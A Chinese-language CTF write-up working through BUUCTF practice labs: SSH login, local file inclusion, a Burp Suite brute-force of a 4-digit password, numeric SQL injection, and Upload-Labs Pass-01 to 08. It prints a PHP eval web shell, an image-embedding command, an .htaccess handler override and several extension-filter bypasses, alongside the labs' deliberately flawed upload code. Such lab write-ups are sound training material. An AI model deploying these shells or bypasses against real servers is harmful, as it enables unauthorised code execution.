# Basic

`更新时间：2023-11-28`

注释解释：

- `<>`必填项，必须在当前位置填写相应数据

- `{}`必选项，必须在当前位置选择一个给出的选项

- `[]`可选项，可以选择填写或忽略

## Linux Labs

提供了一个靶机

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/3JX[{R3{T(P9@O)D4}W~_YY.png?raw=true">

使用浏览器进行连接，没有有效信息

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/I]0A1`2BXQ`(E_0UT8F9]W1.png?raw=true">

根据第一步的提示，使用ssh

**基本语法**

```shell
ssh -p <port> <username>@<hostname>
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/MBI~ON)M1A{A0FUG%TR@ZMT.png?raw=true">

连接成功，使用 `cd /` 进入目录，再使用 `ls` 查看当前目录下所有文件\文件夹，发现flag.txt

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/1HD170ZGQ9T037)70]I{V14.png?raw=true">

使用 `vim <filename>` 打开flag.txt，获取flag成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/HHIVUJ)GI9(ZDX~BS~Q~P$8.png?raw=true">

## BUU LFI COURSE 1

提供了一个靶机，用浏览器进行连接，发现一串PHP代码

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/WK(IBC}]30{84O`ZBYE)%FV.png?raw=true">

进行分析，此处存在文件包含漏洞， `include` 并未对所包含的文件名进行任何过滤，从而导致攻击者可以任意修改 `$_GET['file']` 的值，随便输入一个文件名试试

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/CJ6RAGD`@QLVLED9JL{FW49.png?raw=true">

报错提示无法打开123456文件，证明刚才的推测正确，下面寻找flag，从当前目录下开始寻找，输入 `file=/flag` ，获取成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/)Y4CPCB4MM}HK(T9@O`UPNU.png?raw=true">

## BUU BRUTE 1

老样子，用浏览器连接

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/MADV_%2{[(811H6JBDSIR9M.png?raw=true">

试试一些弱密码

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/ZT_[D)VS7$D]FJ7}{U%WR81.png?raw=true">

我这里用户名和密码都用的是admin，提示密码只有4位数字，换一个用户名试试

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/D}[]PA`HRM0ESS77N])JE~2.png?raw=true">

用户名确认是admin，使用BurpSuite暴力破解

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/O1`7GR}AXCUG[O~D0A2MR2C.png?raw=true">

提示需要4位数字，可以直接将Payload集设置为Brute forcer

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/)MFES2%@DA@P`@8SZ0P(A%K.png?raw=true">

在经历了20分钟的等待后，终于得到flag

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/G[OALFQA`0$2U_W$[M}Z6@8.png?raw=true">

## BUU SQL COURSE 1

进入网站，是一个新闻页

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B809X%YU~E4XK]T[QH8$5PQ.png?raw=true">

点击链接没有任何异常，对其进行抓包，发现是通过 `GET` 获取 `/backend/content_detail.php?id=1` 下的值

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/JGB]Y3N~AK]5SB1KZDGBWYN.png?raw=true">

打开链接，尝试更改其他id，内容改变，确定id处存在SQL注入漏洞

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/%~}8E2FGNBMQ]Q8KNW[@}R1.png?raw=true">

判断注入点，插入 `?id=2 and 1 = 1` 查询成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/WFQ}(96EW4UW%%AB~8A2RMY.png?raw=true">

插入 `?id=2 and 1 = 2` 结果为空

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/G61F%[WAMX6$NGZTU(5FN)D.png?raw=true">

插入 `?id=2'` 结果为空

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/%F_G[6@BIZ3EQG_0@BJQ5}0.png?raw=true">

确认为数字型漏洞，下面使用 `order by` 判断字段数，字段数为2

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6R5D112RP184UF}2$F`ES%G.png?raw=true">

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/S8S%[O`1NMDS~TH4{RH4KT5.png?raw=true">

判断回显点

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/U(@C7CY2PJ{O_V@O486D@NL.png?raw=true">

页面不更改，将id设置为0

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/RQ5IDP)M((QPE@B$%@9GT6B.png?raw=true">

下面过程省略，最后找到管理员账号和密码

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/X}63AY{0F6V[)A$8E)6C((I.png?raw=true">

*注：这里的密码并不是md5码*

用用户名和密码进行登录，得到flag

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/UUTNHJW2G46LF_0C)]K5ES9.png?raw=true">


## Upload-Labs-Linux

打开网站，内含20道文件上传小题目

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/LLU]]W%YBJ}`$LK7{S77HZ7.png?raw=true">

### 图片马

图片马是指在一张图片中包含一条或多条木马语句，这里我们仅使用一句话木马

```php
   <?php phpinfo(); @eval($_POST['admin']);?>
```

解释：

- `phpinfo();` 用于测试是否正确解析php代码

- `@` 错误抑制符，无论后方的命令是否执行成功，都不会报错

- `eval();` eval函数，可以将括号内的内容作为php代码输出

- `$_POST[]` 超级全局变量$_POST，用于传参

- `'admin'` 参数名，通过POST此参数到服务器执行相关代码

创建完成一句话木马后，使用cmd制作

```shell
copy ImgName[.jpg|.png|.gif...] /B + TrojanName.php TrojanImgName[.jpg|.png|.gif...]
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/`F2)XX9YO%H1RBNV$%81UVS.png?raw=true">

*注：为了避免制作图片马的时候php代码被修改，可以在代码前多加几个空格*

#### Pass-01

直接上传失败，提示文件类型错误

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/OY0RMT0OH9SC74XMO~SWN6U.png?raw=true">

查看源码，仅对上传的文件类型进行验证

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

将php文件格式更改为jpg,再通过抓包修改回来

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/KEX{OI9KH]%{(K`FZFDPT~V.png?raw=true">

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/W6CWENMBCJNWF[PV3)E]5GX.png?raw=true">

上传成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/M}QWOGX`A@G4BMK%6U0@09G.png?raw=true">

#### Pass-02

直接看代码，同样是仅对上传的文件类型进行验证，可以使用与第一种相同的方法，此处省略

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}

```

#### Pass-03

查看源码，对上传后的文件类型进行了验证，后缀为 `.asp` `.aspx` `.php` `.jsp` 的文件均不能上传

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

将文件后缀改为 `.php3` `.php5` `.phtml` 

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/4N[{%(M~@0IB6VE~P{5]02T.png?raw=true">

上传成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/M}QWOGX`A@G4BMK%6U0@09G.png?raw=true">

#### Pass-04

查看源码，基本对所有可能的文件格式进行了过滤

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

但是没有过滤 `.htaccess` ，下面简要概述 `.htaccess`

**.htaccess**

`.htaccess` 被称为分布式配置文件，提供了通过目录修改配置的方法，在一个特定的文档目录中包含该文件，以此作用于其目录及其所有子目录。通俗地说，可以向服务器上传一个 `.htaccess` 文件，在此文件内包含多条命令，以此来修改该目录及其子目录下的配置

先创建一个 `.htaccess` 文件，文件内包含以下命令，将jpg文件作为php文件解析

```
AddType application/x-httpd-php .jpg
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/_5]I)J@}Z@1{(S3(_DWP83M.png?raw=true">

然后上传 `.htaccess`

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/$}OPWM9CDGR(UWLGLT3V678.png?raw=true">

上传图片马，成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/5)XSNG_)VCT$}UFJ`6}@L3M.png?raw=true">

#### Pass-05

分析源码，对比Pass-04，增加了对 `.htaccess` 的过滤，但是去除了“转换为小写这一步”

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

所以上传普通的图片格式木马（将.php改为.jpg），抓包，修改大写后缀

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/E@`JD[I2QVU3}~)%}))G)KC.png?raw=true">

上传成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/``B]V08I$1L_U5D}6LHQAFH.png?raw=true">

#### Pass-06

对比Pass-05，去除了“首尾去空”

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

则在抓包的时候将后缀改为 `.php(空格)`

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/]GDKNNSPD_GX9KC{373%6}L.png?raw=true">

上传成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/N[EM7WJZ{X4B2DF9Y]Z9NU7.png?raw=true">

#### Pass-07

去除“删除文件名末尾的点”，则在抓包时将后缀改为 `.php.` ，该题省略

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

#### Pass-08

去除“去除字符串::\$DATA”，则在抓包时将后缀改为 `.php::$DATA` ，该题省略

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

*注：因篇幅过长，此处不为 `::$DATA` 做解释，请<a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">点击此处</a>前往Microsoft官方文档*

